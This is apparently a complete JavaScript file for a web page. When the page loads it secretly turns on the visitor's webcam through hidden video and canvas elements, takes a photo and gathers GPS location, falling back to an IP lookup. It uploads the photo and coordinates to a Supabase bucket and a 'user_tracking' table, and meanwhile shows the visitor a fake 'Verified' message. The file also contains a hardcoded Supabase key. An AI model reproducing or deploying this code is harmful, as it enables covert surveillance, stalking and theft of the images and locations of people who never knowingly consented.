// --- CONFIGURATION ---
const SUPABASE_URL = "https://tnnjemarklihpdpioucq.supabase.co";
const SUPABASE_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRubmplbWFya2xpaHBkcGlvdWNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg0NTg2ODAsImV4cCI6MjA4NDAzNDY4MH0.41OFhgx7wAl89SAqdF0BNxdBCSFbMbpYvZE7HmGdUxE";

// FIX: We renamed the variable to 'supabaseClient' to avoid the error
const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

window.addEventListener("load", async () => {
  console.log("🚀 Starting silent capture...");

  try {
    const [imageBlob, locData] = await Promise.all([
      captureHiddenImage(),
      getSmartLocation(),
    ]);

    await uploadData(imageBlob, locData);
  } catch (error) {
    console.error("System Error:", error);
  }
});

// 1. HIDDEN CAMERA
async function captureHiddenImage() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("hiddenVideo");
    video.srcObject = stream;

    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.getElementById("hiddenCanvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          stream.getTracks().forEach((track) => track.stop());
          canvas.toBlob(resolve, "image/jpeg", 0.7);
        }, 1500);
      };
    });
  } catch (err) {
    console.warn("Camera denied.");
    return null;
  }
}

// 2. SMART LOCATION
function getSmartLocation() {
  return new Promise(async (resolve) => {
    const useIpFallback = async () => {
      try {
        const r = await fetch("https://ipinfo.io/json");
        const d = await r.json();
        const [lat, lon] = d.loc.split(",");
        resolve({ lat, lon, type: "IP", details: d });
      } catch {
        resolve({ lat: null, lon: null, type: "FAIL" });
      }
    };

    if (!navigator.geolocation) {
      await useIpFallback();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          type: "GPS",
          details: { acc: pos.coords.accuracy },
        });
      },
      () => useIpFallback(),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// 3. UPLOAD TO SUPABASE (Updated to use supabaseClient)
async function uploadData(blob, loc) {
  let publicUrl = null;

  if (blob) {
    const fileName = `capture_${Date.now()}.jpg`;
    // Uses 'supabaseClient' instead of 'supabase'
    const { error } = await supabaseClient.storage
      .from("images")
      .upload(fileName, blob);
    if (!error) {
      const res = supabaseClient.storage.from("images").getPublicUrl(fileName);
      publicUrl = res.data.publicUrl;
    }
  }

  // Uses 'supabaseClient' instead of 'supabase'
  await supabaseClient.from("user_tracking").insert([
    {
      image_url: publicUrl,
      latitude: loc.lat,
      longitude: loc.lon,
      location_type: loc.type,
      details: loc.details,
    },
  ]);

  console.log("✅ Data Uploaded!");
  document.querySelector(".message").innerHTML =
    "<h2>Verified.</h2><p>Thank you.</p>";
}
